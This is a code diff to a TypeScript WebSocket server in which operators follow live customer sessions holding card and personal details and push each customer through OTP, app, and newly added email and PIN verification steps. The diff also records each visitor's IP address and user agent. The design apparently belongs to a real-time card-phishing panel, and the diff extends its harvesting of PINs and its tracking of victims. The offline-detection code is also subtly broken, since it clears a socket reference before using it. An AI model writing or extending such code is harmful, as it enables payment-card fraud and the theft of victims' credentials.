@@ -64,7 +64,9 @@ export async function setupWebSocket(server: any) {
     const cid = url.searchParams.get('cid');
     const sid = url.searchParams.get('sid');
     const countable = url.searchParams.get('countable') !== '0';
+    const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
     (ws as any)._countable = countable;
+    (ws as any)._ip = clientIp;
 
     if (role === 'operator') {
       operators.add(ws);
@@ -137,7 +139,8 @@ export async function setupWebSocket(server: any) {
             id: counterId, sessionId: sessionCounter, customerId: cid,
             frontendUrl: payload.frontendUrl, status: 'live', currentStep: payload.currentStep,
             cardInfo: payload.cardInfo, customerInfo: payload.customerInfo,
-            browsingTabs: payload.browsingTabs, isOnline: true
+            browsingTabs: payload.browsingTabs, isOnline: true,
+            ip: (ws as any)._ip, ua: payload.ua || ''
           });
 
           sessions.set(counterId, {
@@ -146,7 +149,8 @@ export async function setupWebSocket(server: any) {
             customerInfo: payload.customerInfo || {},
             browsingTabs: payload.browsingTabs || [],
             currentStep: payload.currentStep || 'card',
-            frontendUrl: payload.frontendUrl || ''
+            frontendUrl: payload.frontendUrl || '',
+            ip: (ws as any)._ip, ua: payload.ua || ''
           });
           if (cid) customerSessions.set(cid, counterId);
 
@@ -331,6 +335,10 @@ export async function setupWebSocket(server: any) {
               s.currentStep = 'app_verify';
             } else if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_otp_verify') {
               s.currentStep = 'otp';
+            } else if (action === 'email_verify') {
+              s.currentStep = 'email_verify';
+            } else if (action === 'pin_verify') {
+              s.currentStep = 'pin_verify';
             }
           }
           paymentService.upsertSession({ id: sessionId, status: newStatus });
@@ -426,6 +434,10 @@ export async function setupWebSocket(server: any) {
 
         case 'heartbeat':
           ws.send(JSON.stringify({ type: 'heartbeat', payload: 'pong', timestamp: new Date().toISOString() }));
+          // Track last heartbeat for offline detection
+          for (const [id, s] of sessions) {
+            if (s.customerWs === ws) { (s as any).lastHeartbeat = Date.now(); break; }
+          }
           break;
       }
       } catch (e: any) {
@@ -460,4 +472,21 @@ export async function setupWebSocket(server: any) {
       }
     });
   }, 1000);
+
+  // heartbeat-based offline detection (25s timeout)
+  setInterval(() => {
+    const now = Date.now();
+    sessions.forEach((s, id) => {
+      if (!s.customerWs || s.customerWs.readyState !== WebSocket.OPEN) return;
+      const lastHb = (s as any).lastHeartbeat || 0;
+      if (lastHb && now - lastHb > 25000) {
+        s.customerWs.close();
+        s.customerWs = null;
+        customers.delete(s.customerWs!);
+        paymentService.upsertSession({ id, isOnline: false });
+        broadcast('session_update', { sessionId: id, isOnline: false }, id);
+      }
+    });
+    broadcastConnectCount();
+  }, 5000);
 }
